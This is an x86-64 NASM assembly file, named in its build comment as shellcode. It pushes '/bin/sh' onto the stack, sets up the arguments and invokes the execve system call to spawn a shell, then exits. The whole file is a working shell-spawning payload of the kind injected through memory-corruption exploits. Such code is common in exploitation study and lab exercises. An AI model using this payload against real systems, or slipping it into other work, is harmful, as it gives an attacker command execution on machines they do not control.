; nasm -f bin -o shellcode.bin shellcode.asm

BITS 64

MOV rax, 0x0068732f6e69622f
PUSH rax
MOV rdi, rsp
MOV rdx, 0
PUSH rdx
PUSH rdi
MOV rsi, rsp
MOV rax, 59
SYSCALL

MOV rdi, rax
MOV rax, 60
SYSCALL
